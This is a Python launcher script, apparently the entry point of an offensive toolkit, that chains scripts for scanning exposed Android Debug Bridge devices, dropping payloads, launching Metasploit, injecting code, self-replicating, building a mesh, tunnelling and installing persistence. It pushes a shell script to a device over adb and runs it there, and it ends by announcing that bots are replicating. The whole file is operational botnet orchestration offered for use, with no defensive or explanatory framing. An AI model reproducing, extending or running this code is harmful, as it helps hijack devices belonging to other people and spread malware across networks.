import subprocess
import threading
import time
import os

USE_TUNNEL = True
USE_PERSISTENCE = True
USE_EVA_CORE = True

def run(script):
    print(f"\n[>>>] Running {script}...\n")
    subprocess.run(["python3", script])

def run_bg(script):
    print(f"[###] Launching {script} in background...\n")
    threading.Thread(target=lambda: subprocess.run(["python3", script])).start()

def run_bg_silent(script):
    print(f"[>>>] Running {script} in background (silent)...\n")
    subprocess.Popen(["python3", script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def run_sh(script):
    print(f"[###] Running shell script: {script}...\n")
    subprocess.run(["adb", "push", script, "/sdcard/Download/"])
    subprocess.run(["adb", "shell", f"sh /sdcard/Download/{script}"])

def banner():
    print(r"""
▗▄▄▄▖▗▖  ▗▖ ▗▄▖      ▗▄▖ ▗▄▄▄ ▗▄▄▖     
▐▌   ▐▌  ▐▌▐▌ ▐▌    ▐▌ ▐▌▐▌  █▐▌ ▐▌    
▐▛▀▀▘▐▌  ▐▌▐▛▀▜▌    ▐▛▀▜▌▐▌  █▐▛▀▚▖    
▐▙▄▄▖ ▝▚▞▘ ▐▌ ▐▌    ▐▌ ▐▌▐▙▄▄▀▐▙▄▞▘    

     By: ek0msSavi0r
""")

def main():
    banner()
    run("adb_reaper.py")
    run_bg_silent("local_adb_scanner.py")  # 🧠 Now non-blocking
    run("adb_dropper.py")
    run("metasploit_launcher.py")
    run("jeangrey_injector.py")
    run_bg("jeangrey_replication.py")
    run_bg("jeangrey_mesh.py")
    if USE_TUNNEL:
        run_bg("jeangrey_tunnel.py")
    if USE_PERSISTENCE:
        run_sh("jeangrey_persist.sh")
    if USE_EVA_CORE:
        run_bg("eva_core.py")
    print("\n[✓] EVA Network launched. Bots replicating. Mesh is alive.")

if __name__ == "__main__":
    main()
